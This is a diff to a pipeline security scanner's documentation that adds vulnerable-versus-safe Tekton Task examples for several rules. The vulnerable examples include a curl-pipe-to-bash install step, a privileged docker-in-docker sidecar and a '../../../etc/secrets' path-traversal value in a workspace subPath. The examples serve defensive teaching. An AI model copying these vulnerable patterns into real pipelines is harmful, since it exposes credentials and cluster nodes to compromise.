+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: upload }
+spec:
+  steps:
+    - name: upload
+      image: aws-cli@sha256:abc123...
+      env:
+        - name: AWS_ACCESS_KEY_ID
+          valueFrom:
+            secretKeyRef: { name: aws-uploader, key: access_key_id }
+        - name: AWS_SECRET_ACCESS_KEY
+          valueFrom:
+            secretKeyRef: { name: aws-uploader, key: secret_access_key }
+```
 
 **Source:** [`TKN-005`](../providers/tekton.md#tkn-005) in the [Tekton provider](../providers/tekton.md).
 
@@ -10782,6 +18155,39 @@ resource "aws_route_table_association" "build" {
 **Known false positives.**
 
 - Tasks running entirely against an internal mirror (``curl https://internal-mirror/install.sh | sh`` where the mirror is the same supply chain as the task image itself) carry less marginal risk than a public-internet fetch, but the rule still fires because the curl-pipe primitive is the structural signal. ``curl -k`` to a TLS endpoint with a known self-signed CA likewise triggers; the canonical fix is to install the CA into the step image and drop ``-k``, but per-task suppression via ``--ignore-file`` is the escape hatch.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` trusts the network path AND
+# the installer host. A MITM (compromised proxy, malicious
+# DNS) or a publisher compromise ships malicious code into
+# the step's shell with the step's full credential set
+# in scope (TaskRun ServiceAccount, mounted Secrets).
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  steps:
+    - name: install-cli
+      image: alpine@sha256:abc123...
+      script: |
+        curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download, verify against a known-good sha256, then
+# execute. If the upstream content changes, the digest
+# stops matching and the step fails loud.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  steps:
+    - name: install-cli
+      image: alpine@sha256:abc123...
+      script: |
+        set -e
+        curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+        echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+        bash /tmp/cli.sh
+```
 
 **Source:** [`TKN-008`](../providers/tekton.md#tkn-008) in the [Tekton provider](../providers/tekton.md).
 
@@ -10837,6 +18243,39 @@ resource "aws_route_table_association" "build" {
 
 - Tasks that genuinely need ``docker:dind`` as a sidecar, e.g. building images inside the cluster without giving the step itself host-Docker access. The replacement pattern is Kaniko or BuildKit running as the step itself, with no privileged sidecar; if neither is viable, ignore TKN-013 in ``.pipeline-check-ignore.yml`` for the affected Task.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a sidecar runs alongside every step in the
+# Task and shares the pod's volumes / network. A
+# privileged sidecar can escape to the node the same way
+# a privileged step does, with the added attack surface
+# of being long-lived for the Task's whole duration.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  sidecars:
+    - name: docker-daemon
+      image: docker:24-dind
+      securityContext:
+        privileged: true
+  steps:
+    - name: build
+      image: docker:24
+      script: docker build -t app .
+
+# Safe: drop the privileged sidecar and use a rootless
+# builder in the step. Kaniko / BuildKit rootless
+# eliminates the need for the dind sidecar entirely.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  steps:
+    - name: build
+      image: gcr.io/kaniko-project/executor@sha256:abc123...
+      args: [--context=., --destination=registry/app:tag]
+```
+
 **Source:** [`TKN-013`](../providers/tekton.md#tkn-013) in the [Tekton provider](../providers/tekton.md).
 
 ### `TKN-014`: Tekton step script runs unpinned package install <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-014 }
@@ -10866,6 +18305,46 @@ The detection scans the step-level ``workspaces:`` list (``spec.steps[*].workspa
 **Known false positives.**
 
 - Some teams use a parameter to select between a small set of allowed sub-paths and rely on a step pre-check to reject anything off-list. The rule has no way to see that pre-check; suppress on the specific step name when this is the deliberate shape.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``$(params.target)`` is substituted into
+# the workspace ``subPath`` literally. A PipelineRun with
+# ``target: ../../../etc/secrets`` (or similar traversal)
+# escapes the intended workspace directory and reads /
+# writes outside it.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  params:
+    - name: target
+  workspaces:
+    - name: shared
+      subPath: $(params.target)
+  steps:
+    - name: write
+      image: alpine@sha256:abc123...
+      script: |
+        echo data > /workspace/shared/out
+
+# Safe: pin the subPath to a static literal or validate
+# the param shape upstream (in the Pipeline) against an
+# allowlist of expected names. Tekton has no built-in
+# path-canonicalisation for subPath, so the gate is on
+# the producer of the param.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  workspaces:
+    - name: shared
+      subPath: artifacts
+  steps:
+    - name: write
+      image: alpine@sha256:abc123...
+      script: |
+        echo data > /workspace/shared/out
+```
 
 **Source:** [`TKN-015`](../providers/tekton.md#tkn-015) in the [Tekton provider](../providers/tekton.md).
 
